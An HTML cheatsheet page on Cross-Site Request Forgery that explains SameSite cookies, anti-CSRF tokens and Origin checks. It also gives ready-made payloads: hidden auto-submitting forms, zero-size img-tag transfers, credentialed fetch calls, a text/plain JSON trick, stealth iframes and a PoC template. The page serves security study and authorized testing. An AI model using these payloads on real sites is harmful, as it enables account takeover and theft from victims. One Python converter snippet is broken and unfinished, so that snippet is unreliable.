@@ -1,0 +1,422 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CSRF · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Sessions</nav><h1>CSRF</h1><p class="cx-lede">Cross-Site Request Forgery - coercing the victim&#x27;s authenticated browser to make state-changing requests, auto-submit HTML forms, GET-based vs POST-based abuse, SameSite cookie defense behavior, and the anti-CSRF token landscape.</p><div class="cx-tags"><span class="cx-tag">MITRE T1212, T1185</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT SessionTakeover, AccountTakeover</span><span class="cx-tag">OWASP A01</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>CSRF abuses the fact that browsers automatically attach cookies to requests, regardless of which page issued the request. If <code>evil.com</code> makes a request to <code>target.com/api/change-email</code>, the victim's <code>target.com</code> cookies tag along - and unless the target verifies "did the victim actually mean to do this" via an anti-CSRF token, the request succeeds in the victim's name.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Find a state-changing request that uses only cookies for auth
+#    (no CSRF token, no SameSite=Strict cookie)
+
+# 2. Auto-submit form attack (POST)
+&lt;form id=f action=http://target/api/change-email method=POST&gt;
+  &lt;input name=email value=attacker@evil.com&gt;
+&lt;/form&gt;
+&lt;script&gt;f.submit()&lt;/script&gt;
+
+# 3. Image-tag attack (GET)
+&lt;img src=&quot;http://target/api/transfer?to=attacker&amp;amount=10000&quot;&gt;
+
+# 4. Victim visits attacker page while logged in → state change happens</code></pre></figure>
+<p>Success indicator: the action's effect on the target - email changed, money moved, permission granted - happens <em>to the victim's account</em> even though the victim never visited the target site to do it.</p>
+<h2 id="the-mechanic-in-one-paragraph">The mechanic in one paragraph</h2>
+<p>Cookies are origin-scoped: a cookie set by <code>target.com</code> is sent on every request to <code>target.com</code>, <em>no matter which page made the request</em>. A <code>&lt;form action="http://target.com/..."&gt;</code> on <code>evil.com</code> POSTs to target with the cookies attached. The target server sees an authenticated request and processes it. The victim sees nothing - at most a brief page redirect they might not even notice.</p>
+<p>This is the entire premise. CSRF defenses (anti-CSRF tokens, SameSite cookies, double-submit cookies) all exist to add a check the server can apply that says "this request <em>originated from</em> a page on my own site," because the cookie alone doesn't prove that.</p>
+<h2 id="when-csrf-is-exploitable">When CSRF is exploitable</h2>
+<p>A request is CSRF-able when:</p>
+<ol>
+<li><strong>The request changes server state</strong> (or accesses sensitive data - though defense usually focuses on state changes)</li>
+<li><strong>The authentication for the request is automatic</strong> - cookies attached by the browser, HTTP Basic auth from password manager, certs, etc.</li>
+<li><strong>The request's parameters are predictable</strong> - the attacker can guess or fix the values</li>
+<li><strong>No anti-CSRF check</strong> - no token, weak token, SameSite=Lax/None for the cookie, missing Origin/Referer check</li>
+</ol>
+<p>When all four hold, the attacker crafts an HTML page that issues the request and gets the victim to visit it.</p>
+<h3 id="what-csrf-doesnt-do">What CSRF doesn't do</h3>
+<p>CSRF doesn't let the attacker <em>read</em> the response. The victim's browser fires the request and gets the response, but the attacker's JavaScript on <code>evil.com</code> can't see it because of the Same-Origin Policy (SOP). So CSRF is one-way:</p>
+<table>
+<thead>
+<tr>
+<th>Operation</th>
+<th>CSRF-effective</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Change email / password</td>
+<td>Yes (state change, no need to read response)</td>
+</tr>
+<tr>
+<td>Transfer money</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Add admin user</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Delete account</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Read account balance</td>
+<td>No (attacker can't see response)</td>
+</tr>
+<tr>
+<td>Steal session cookie value</td>
+<td>No (attacker can't read response) - use XSS instead</td>
+</tr>
+</tbody>
+</table>
+<p>For <em>reading</em> data cross-origin, you need XSS (where your script runs in the target's origin and SOP doesn't restrict you).</p>
+<h2 id="the-three-attack-payloads">The three attack payloads</h2>
+<h3 id="get-based-image-tag">GET-based - image tag</h3>
+<p>When the state change is triggered by a GET request (poorly designed but historically common):</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;img src=&quot;http://target.com/api/transfer?to=attacker&amp;amount=10000&quot; width=0 height=0&gt;</code></pre></figure>
+<p>The victim visits the attacker's page; the <code>&lt;img&gt;</code> tag triggers a GET to the target URL; the target processes it. The image fails to load (no actual image returned) but the side effect happened.</p>
+<p>Stealth tricks:</p>
+<ul>
+<li><code>width=0 height=0</code> hides the broken-image icon</li>
+<li>Place inside <code>&lt;div style="display:none"&gt;</code> to fully hide</li>
+<li>Use a 1x1 transparent PNG response (if the target's vulnerable endpoint allows it) to make the page look normal</li>
+</ul>
+<h3 id="post-based-auto-submit-form">POST-based - auto-submit form</h3>
+<p>When the state change is triggered by a POST:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;html&gt;
+  &lt;body onload=&quot;document.forms[0].submit()&quot;&gt;
+    &lt;form action=&quot;http://target.com/api/change-email&quot; method=&quot;POST&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;attacker@evil.com&quot;&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;confirm&quot; value=&quot;attacker@evil.com&quot;&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</code></pre></figure>
+<p>The <code>&lt;body onload&gt;</code> triggers the form submission as soon as the page loads. <code>display:none</code> is optional - the form fields are already hidden because they're <code>type="hidden"</code>.</p>
+<p>Variants for stealth:</p>
+<ul>
+<li><code>&lt;iframe src="csrf-page.html" style="display:none"&gt;&lt;/iframe&gt;</code> - load the CSRF page in a hidden iframe on a "normal-looking" attacker site</li>
+<li>Wrap in <code>document.body.addEventListener('click', ...)</code> to fire only on user interaction (avoid popup-blocker / autoplay restrictions in some contexts)</li>
+</ul>
+<h3 id="xhr-fetch-from-attacker-domain-rarely-useful">XHR / Fetch from attacker domain (rarely useful)</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+  fetch(&#x27;http://target.com/api/change-email&#x27;, {
+    method: &#x27;POST&#x27;,
+    credentials: &#x27;include&#x27;,
+    headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
+    body: &#x27;email=attacker@evil.com&#x27;,
+  });
+&lt;/script&gt;</code></pre></figure>
+<p><code>credentials: 'include'</code> is the key - without it, fetch doesn't send cookies cross-origin. With it, the browser sends <code>target.com</code>'s cookies along with the request.</p>
+<p>Two limitations:</p>
+<ol>
+<li><strong>CORS preflight</strong> - non-simple POSTs (any content-type besides <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>) trigger a CORS preflight OPTIONS request. The target's response to OPTIONS must allow your origin or the actual request is never sent.</li>
+<li><strong>SameSite cookies</strong> - cookies marked <code>SameSite=Strict</code> are <em>not</em> sent on cross-origin fetches even with <code>credentials: 'include'</code>. <code>SameSite=Lax</code> allows them only on top-level navigations (form submissions count; XHR doesn't).</li>
+</ol>
+<p>So XHR-based CSRF only works against targets that accept simple-form-encoded POSTs and have <code>SameSite=None</code> (or no SameSite, which is now <code>Lax</code> by browser default).</p>
+<h2 id="get-vs-post-what-difference-does-it-make">GET vs POST - what difference does it make</h2>
+<p>The HTTP spec says GET should be safe (no state change). Apps that violate this - using GET for state-changing actions - are easier CSRF targets because:</p>
+<ul>
+<li>Image tag CSRF doesn't require a separate attacker page (<code>&lt;img src="http://target/.../delete?id=42"&gt;</code> can be embedded anywhere)</li>
+<li>No form submission needed</li>
+<li>Works in places where attacker can inject HTML but not script (forum signature, profile bio)</li>
+</ul>
+<p>POST is harder to exploit but only marginally - the auto-submit form pattern adds maybe 10 lines of HTML.</p>
+<p>A target that uses GET for state changes is making a <em>separate</em> mistake (HTTP semantics violation) and the CSRF surface is a side effect of that. Reporting it should flag both issues.</p>
+<h2 id="samesite-cookies-the-modern-defense">SameSite cookies - the modern defense</h2>
+<p>In 2020, Chrome started defaulting cookies to <code>SameSite=Lax</code>. Other browsers followed. This dramatically reduced CSRF surface:</p>
+<table>
+<thead>
+<tr>
+<th>SameSite</th>
+<th>Cross-origin behavior</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Strict</code></td>
+<td>Cookies <em>never</em> sent cross-origin. CSRF completely blocked. Side effect: cookies aren't sent when victim clicks a link from external site to target either - annoying UX.</td>
+</tr>
+<tr>
+<td><code>Lax</code> (default)</td>
+<td>Cookies sent on top-level navigations (clicking a link, form GET) but not on subresource requests (<code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, fetch). Blocks most CSRF.</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>Cookies sent on all cross-origin requests if <code>Secure</code> is also set. CSRF surface intact.</td>
+</tr>
+</tbody>
+</table>
+<p>Effect on the three payloads above:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th><code>SameSite=Strict</code></th>
+<th><code>SameSite=Lax</code></th>
+<th><code>SameSite=None</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Image GET (<code>&lt;img src&gt;</code>)</td>
+<td>Blocked</td>
+<td>Blocked (subresource)</td>
+<td>Works</td>
+</tr>
+<tr>
+<td>Form POST (<code>&lt;form&gt;</code>) auto-submit</td>
+<td>Blocked</td>
+<td>Blocked (subresource - well, sort of)¹</td>
+<td>Works</td>
+</tr>
+<tr>
+<td>XHR / fetch with credentials</td>
+<td>Blocked</td>
+<td>Blocked (not top-level nav)</td>
+<td>Works</td>
+</tr>
+</tbody>
+</table>
+<p>¹ The Lax/POST interaction is a common source of confusion. The exact rule: Lax allows cookies on top-level navigations <em>that use safe methods</em> (GET, HEAD). A top-level POST navigation (form submit at the top level, not in an iframe) does <strong>not</strong> send Lax cookies. So an auto-submit POST form in a top-level page where the victim explicitly visits is still blocked by Lax. Result: Lax effectively kills POST CSRF unless the cookie is <code>None</code>.</p>
+<h3 id="what-this-means-in-2024">What this means in 2024+</h3>
+<p>When the target uses default-modern cookie configuration (<code>Lax</code> by default, often <code>Strict</code> for sensitive cookies), classic cross-origin CSRF is largely dead. The attacker needs one of:</p>
+<ul>
+<li>A target that explicitly sets <code>SameSite=None; Secure</code> (legacy compatibility, third-party iframes, etc.)</li>
+<li>A target on the same site as a place the attacker can inject HTML - SameSite is about cross-<em>site</em>, not cross-<em>origin</em>. <code>attacker.target.com</code> and <code>app.target.com</code> are same-site.</li>
+<li>An XSS on the target - XSS makes requests from the target's origin, defeating SameSite entirely</li>
+</ul>
+<p>This last is why <a href="../xss-csrf-chain/index.html">XSS + CSRF chain</a> is the modern attack pattern.</p>
+<h2 id="anti-csrf-tokens">Anti-CSRF tokens</h2>
+<p>Even before SameSite, the canonical defense was a CSRF token: an unguessable random value tied to the user's session, embedded in forms, verified server-side.</p>
+<p>The pattern:</p>
+<ol>
+<li>User logs in, server stores a per-session CSRF token: <code>csrf=R0ANDOM123ABC</code></li>
+<li>Server renders forms with a hidden field: <code>&lt;input type="hidden" name="csrf" value="R0ANDOM123ABC"&gt;</code></li>
+<li>User submits form; request includes both the cookie and the token</li>
+<li>Server checks: does the token match the session's stored token? If not, reject.</li>
+</ol>
+<p>Attacker can't read the token from <code>evil.com</code> (SOP prevents that), so they can't include it in their crafted request, so the server rejects.</p>
+<p>Variants:</p>
+<ul>
+<li><strong>Per-request token</strong> - new token issued on every page load, invalidates prior tokens. Strongest. Requires careful session state.</li>
+<li><strong>Per-session token</strong> - one token for the entire session. More common, slightly weaker.</li>
+<li><strong>Double-submit cookie</strong> - token sent both as cookie and as form field; server checks they match. Doesn't actually require server-side state. Vulnerable to cookie-fixing attacks but doesn't need backend storage.</li>
+<li><strong>Encrypted/HMAC token</strong> - token is a HMAC of the session ID (or user ID) using a server secret. Stateless.</li>
+</ul>
+<h3 id="where-the-token-lives">Where the token lives</h3>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Operator note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hidden form field</td>
+<td>Most common. Visible in HTML source.</td>
+</tr>
+<tr>
+<td>Custom HTTP header (<code>X-CSRF-Token</code>)</td>
+<td>Common for SPA / API. Browsers don't auto-attach custom headers, so cross-origin XHR can't forge them.</td>
+</tr>
+<tr>
+<td>Cookie + matching header</td>
+<td>Double-submit cookie variant.</td>
+</tr>
+<tr>
+<td>URL query parameter</td>
+<td>Rare and discouraged (leaks in Referer, logs).</td>
+</tr>
+<tr>
+<td>Body parameter in JSON POST</td>
+<td>Common in JSON APIs.</td>
+</tr>
+</tbody>
+</table>
+<p>To find it: look at any state-changing form on the target. View source, find the hidden field. Common names: <code>csrf</code>, <code>csrf_token</code>, <code>_token</code>, <code>authenticity_token</code> (Rails), <code>RequestVerificationToken</code> (.NET), <code>csrfmiddlewaretoken</code> (Django), <code>_csrf</code> (Express), <code>nonce</code> (WordPress).</p>
+<p>If no obvious token is in the form, check headers - many APIs send tokens as <code>X-CSRF-Token</code> or <code>X-XSRF-TOKEN</code>.</p>
+<h3 id="origin-referer-checking">Origin / Referer checking</h3>
+<p>An alternative defense: server checks the <code>Origin</code> and/or <code>Referer</code> header on state-changing requests. If they don't match the target's origin, reject.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>POST /api/change-email HTTP/1.1
+Origin: https://evil.com         ← server rejects: not its own origin
+Referer: https://evil.com/csrf-page.html</code></pre></figure>
+<p>Browsers don't let JavaScript override <code>Origin</code> or <code>Referer</code>, so an attacker can't fake them. But:</p>
+<ul>
+<li>Some legitimate cases (privacy modes, some Firefox extensions) strip the Referer; if the app falls back to "allow if Referer absent," that's a bypass</li>
+<li>Sometimes the regex for "matches our origin" is weak - <code>target.com</code> matches <code>target.com.evil.com</code> if the regex is <code>.*target\.com.*</code></li>
+</ul>
+<p>See <a href="../csrf-token-bypass/index.html">CSRF Token Bypass</a> for the bypass catalog.</p>
+<h2 id="crafting-the-proof-of-concept">Crafting the proof-of-concept</h2>
+<p>A clean CSRF PoC has these parts:</p>
+<ol>
+<li><strong>Minimal HTML</strong> - fits in a single small file, no external dependencies</li>
+<li><strong>Self-submitting</strong> - fires automatically when the page loads</li>
+<li><strong>Hidden</strong> - no visible content that would alert the victim</li>
+<li><strong>Includes proof of effect</strong> - the demonstrated change is unambiguous (email changed to a value the report's reader knows is yours)</li>
+</ol>
+<p>Template:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;CSRF PoC&lt;/title&gt;&lt;/head&gt;
+&lt;body onload=&quot;document.getElementById(&#x27;f&#x27;).submit()&quot;&gt;
+  &lt;form id=&quot;f&quot; action=&quot;http://target.com/api/change-email&quot; method=&quot;POST&quot; style=&quot;display:none&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;csrf-poc-attacker@evil.invalid&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;confirm_email&quot; value=&quot;csrf-poc-attacker@evil.invalid&quot;&gt;
+  &lt;/form&gt;
+  &lt;p&gt;Loading...&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></figure>
+<p>Serve it:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">python3 -m http.server 1337</code></pre></figure>
+<p>Have the test victim (logged in to target) visit <code>http://your-ip:1337/csrf.html</code>. The form submits, the email changes, the report screenshot shows the changed email on the victim's account.</p>
+<h3 id="when-the-form-has-more-fields">When the form has more fields</h3>
+<p>Sometimes you need to include lots of fields. The trick is the Burp-captured request:</p>
+<ol>
+<li>Use Burp Proxy to capture the legitimate request (yourself, logged in, performing the action)</li>
+<li>Right-click in Proxy history → Engagement Tools → Generate CSRF PoC</li>
+<li>Burp produces the form HTML automatically</li>
+</ol>
+<p>If Burp Community doesn't have this feature available in your version, build it manually:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># A simple converter: take a Burp request, output an HTML form
+cat burp_request.txt | python3 -c &#x27;
+import sys, re
+body = sys.stdin.read().split(&quot;\r\n\r\n&quot;, 1)[1] if &quot;\r\n\r\n&quot; in sys.stdin.read() else &quot;&quot;
+# parse key=value pairs from body and emit form
+&#x27;</code></pre></figure>
+<p>In practice, Burp Pro's auto-generator handles this; for community, view-source on the legitimate form is usually fine.</p>
+<h3 id="form-encoding-gotchas">Form-encoding gotchas</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Wrong - &amp; in values will be interpreted as field separator --&gt;
+&lt;input name=&quot;data&quot; value=&quot;a&amp;b=c&quot;&gt;
+
+&lt;!-- Right - HTML-encode --&gt;
+&lt;input name=&quot;data&quot; value=&quot;a&amp;amp;b=c&quot;&gt;</code></pre></figure>
+<p>Special characters in form values need HTML entities (<code>&amp;amp;</code>, <code>&amp;quot;</code>, etc.) to survive the HTML parse before form submission.</p>
+<h2 id="common-csrf-able-actions">Common CSRF-able actions</h2>
+<p>In order of impact:</p>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Change email</td>
+<td>Account takeover (password reset goes to attacker's email)</td>
+</tr>
+<tr>
+<td>Change password</td>
+<td>Direct account takeover</td>
+</tr>
+<tr>
+<td>Change 2FA settings</td>
+<td>Disable victim's 2FA</td>
+</tr>
+<tr>
+<td>Add SSH key to account</td>
+<td>Persistent backdoor on dev platforms</td>
+</tr>
+<tr>
+<td>Add admin user</td>
+<td>Privilege escalation in apps with role management</td>
+</tr>
+<tr>
+<td>Transfer funds</td>
+<td>Financial impact</td>
+</tr>
+<tr>
+<td>Delete account</td>
+<td>Denial-of-service against victim</td>
+</tr>
+<tr>
+<td>Subscribe to plan / pay</td>
+<td>Financial damage to victim</td>
+</tr>
+<tr>
+<td>Post content as victim</td>
+<td>Reputation damage, phishing platform</td>
+</tr>
+<tr>
+<td>Click "approve" on OAuth consent</td>
+<td>Grant attacker-controlled app access to victim's data</td>
+</tr>
+</tbody>
+</table>
+<p>For real engagements, <strong>change email</strong> is usually the highest-impact CSRF finding because it cleanly leads to full account takeover via the password reset chain.</p>
+<h2 id="csrf-in-json-apis">CSRF in JSON APIs</h2>
+<p>Many modern apps use JSON instead of form-encoded bodies. JSON CSRF is harder for several reasons:</p>
+<ol>
+<li>Forms can't natively POST JSON (no native form type for it)</li>
+<li>Custom Content-Type triggers CORS preflight</li>
+<li>Most modern APIs require <code>Content-Type: application/json</code> and reject form-encoded</li>
+</ol>
+<p>Bypasses:</p>
+<ul>
+<li><strong><code>enctype="text/plain"</code></strong> - a form CAN submit <code>text/plain</code> content type. If the server's JSON parser is lenient, you can craft a body that looks like JSON:</li>
+</ul>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;form action=&quot;http://target/api/change-email&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;
+  &lt;input name=&#x27;{&quot;email&quot;:&quot;attacker@evil.com&quot;,&quot;x&quot;:&quot;&#x27; value=&#x27;ignored&quot;}&#x27;&gt;
+&lt;/form&gt;</code></pre></figure>
+<p>The form submits <code>{"email":"attacker@evil.com","x":"=ignored"}</code> (with the trailing <code>=</code> from name=value) as <code>text/plain</code>. If the server JSON-parses anyway, it accepts.</p>
+<ul>
+<li>
+<p><strong><code>Content-Type: application/x-www-form-urlencoded</code> accepted</strong> - some servers don't strictly enforce content-type matching to body format. Send a form-encoded body that happens to contain a JSON-looking string in a single field.</p>
+</li>
+<li>
+<p><strong>Flash-based CORS bypass</strong> - historically Flash could send arbitrary content-types cross-origin. Flash is dead; this no longer works.</p>
+</li>
+</ul>
+<p>In practice, JSON APIs that properly require <code>application/json</code> are immune to classic cross-origin CSRF.</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Pattern</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Find CSRF target</td>
+<td>Burp → look for state-changing requests without anti-CSRF tokens</td>
+</tr>
+<tr>
+<td>Image-tag GET CSRF</td>
+<td><code>&lt;img src="http://target/.../action?param=value"&gt;</code></td>
+</tr>
+<tr>
+<td>Auto-submit form POST</td>
+<td><code>&lt;body onload=f.submit()&gt;&lt;form id=f action=URL method=POST&gt;...&lt;/form&gt;</code></td>
+</tr>
+<tr>
+<td>Iframe-embedded CSRF</td>
+<td><code>&lt;iframe src="csrf-page.html" style="display:none"&gt;</code></td>
+</tr>
+<tr>
+<td>XHR with credentials</td>
+<td><code>fetch(URL, {method:'POST', credentials:'include', body:...})</code></td>
+</tr>
+<tr>
+<td>Find CSRF token in page</td>
+<td>View source, search <code>csrf</code>, <code>_token</code>, <code>authenticity_token</code>, <code>nonce</code></td>
+</tr>
+<tr>
+<td>Bypass categories</td>
+<td>Token weak / missing-allowed / cross-acct / null - see <a href="../csrf-token-bypass/index.html">CSRF token bypass</a></td>
+</tr>
+<tr>
+<td><code>enctype="text/plain"</code> JSON trick</td>
+<td>Form with crafted name/value submitting a JSON-shaped string as text/plain</td>
+</tr>
+<tr>
+<td>Burp PoC generator</td>
+<td>Right-click request → Engagement Tools → Generate CSRF PoC (Pro)</td>
+</tr>
+<tr>
+<td>SameSite check</td>
+<td>Inspect <code>Set-Cookie</code> for <code>SameSite=</code>; Strict/Lax block cross-site, None permits</td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../xss-to-session/index.html">Previous: XSS to Session</a><a class="cx-next" href="../csrf-token-bypass/index.html">Next: CSRF Token Bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
